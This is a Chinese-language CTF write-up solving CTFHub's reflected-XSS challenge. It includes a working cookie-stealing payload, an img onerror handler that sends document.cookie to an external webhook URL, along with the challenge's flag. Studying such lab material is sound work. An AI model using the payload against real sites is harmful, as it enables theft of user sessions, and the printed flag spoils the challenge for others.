---
title: CTFHub-XSS-反射型 Writeup
date: 2026-10-01
category: Web
tags: [CTFHub, XSS, 反射型]
---
## 题目介绍

题目：XSS Reflex（反射型XSS）
考点：反射型XSS，利用XSS窃取页面Cookie，机器人Bot访问恶意链接获取Flag。
页面功能：输入name参数，页面会直接回显输入内容；提供Send URL to Bot功能，会用后台机器人访问我们构造好的链接，Bot浏览器中存有flag在Cookie里。

## 原理

反射型XSS：用户输入的内容不经过滤，直接输出到网页HTML中，可注入JS代码执行。
目标：构造XSS Payload，当Bot访问链接时，执行JS，把Bot的Cookie发送到我们自己的Webhook接收地址，Cookie中包含flag。

## 环境
临时Webhook接收平台：play.hook0.com
接收地址：https://play.hook0.com/in/c_wqdodftrt7N8F6Y1mFvVLLYSGFG/

## 解题过程

### 1. 测试XSS是否存在
在What's your name输入框输入测试payload：
<script>alert(1)</script>
点击Submit，页面弹出弹窗，说明页面存在反射型XSS，输入直接被渲染到HTML，JS可以执行。
注意：部分场景<script>标签会被过滤，备选使用img标签onerror事件执行JS，兼容性更强。
### 2. 构造Cookie窃取Payload
思路：创建Image对象，请求我们的webhook地址，把document.cookie作为URL参数c带到请求中，Cookie就会出现在webhook收到的请求记录里。
payload
< img src=x onerror="new Image().src='https://play.hook0.com/in/c_wqdodftrt7N8F6Y1mFvVLLYSGFG/?c='+document.cookie">
### 3. 提交Payload，生成恶意链接
将payload粘贴到输入框，点击Submit，页面回显内容，浏览器地址栏生成带?name=的完整URL，这个就是我们构造的XSS链接。

### 4. 发送链接给Bot
把完整URL复制，粘贴到页面Send URL to Bot输入框，点击Send。
后台机器人Bot会独立访问这个链接，Bot浏览器存在带有flag的Cookie，访问页面后触发XSS，执行JS，将Cookie发送到Hook0。

### 5. 在Webhook平台获取Cookie与Flag
打开Hook0页面，等待Bot的请求。
查看收到的GET请求，URL中的参数c=后面的值就是Bot的Cookie，里面包含flag。

## Flag
ctfhub{862c2f36467fe140303e32a5}

## 总结

1. Webhook链接不能带#锚点，#后的内容不会发给服务器，必须使用带/in/的完整地址。

2. 不要手动反复刷新靶场页面，会产生自己浏览器的无效请求，干扰判断。

3. <script>标签有时会被解析限制，优先使用img+onerror事件payload。

4. 网络延迟，Bot请求需要等待10~20秒，需要耐心等待webhook接收记录。
